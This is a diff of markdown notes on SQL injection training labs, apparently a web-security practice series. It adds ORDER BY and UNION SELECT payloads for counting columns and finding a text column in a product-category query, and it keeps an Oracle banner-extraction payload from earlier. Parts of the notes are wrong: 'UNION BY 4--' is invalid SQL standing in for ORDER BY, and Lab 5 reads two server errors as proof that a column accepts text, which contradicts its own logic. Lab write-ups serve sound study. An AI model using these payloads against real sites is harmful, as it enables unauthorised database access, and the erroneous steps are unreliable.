@@ -30,14 +30,29 @@
 - `'union+SELECT+banner,NULL+FROM+v$version--` - Concate the second query with Union clause in Original Query.
 
 ## Lab 4: SQL injection UNION attack, determining the number of columns returned by the query
-- Submitting a series of `UNION SELECT` payloads specifying a different number of null values, will help in determining the columns unless we get the error.
+1. ' ORDER BY 1-- injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.
+- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
+- Modified: `SELECT * FROM products WHERE category = 'Gifts' UNION BY 4--`
+- Query to executed by DB after injections: `It should throw a Server side Error 500`
+
+2. Submitting a series of `UNION SELECT` payloads specifying a different number of null values, will help in determining the columns unless we get the error.
 
 - Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
 - Modified: `SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL,NULL--`
 - Query to executed by DB after injections: `It should throw a Server side Error 500`
 
 
+## Lab 5: SQL injection UNION attack, finding a column containing text
+- First, Determine the number of columns returned by the query.
+- Second, Determine a column that is compatible with string data. 
 
+- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
+- Modified: `SELECT * FROM products WHERE category = 'Gifts' UNION BY 4--` (Server Error, means number of columns = 3)
+- Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+SELECT+'a',NULL,NULL--` (Server Error, means this column accepting text value)
+- Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+SELECT+NULL,NULL,'a'--` (Server Error, means this column accepting text value)
+- Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+SELECT+NULL,'a',NULL--` ('a' determine that the 2nd column accepting text value)
+
+## Lab 6: 
 
 
 
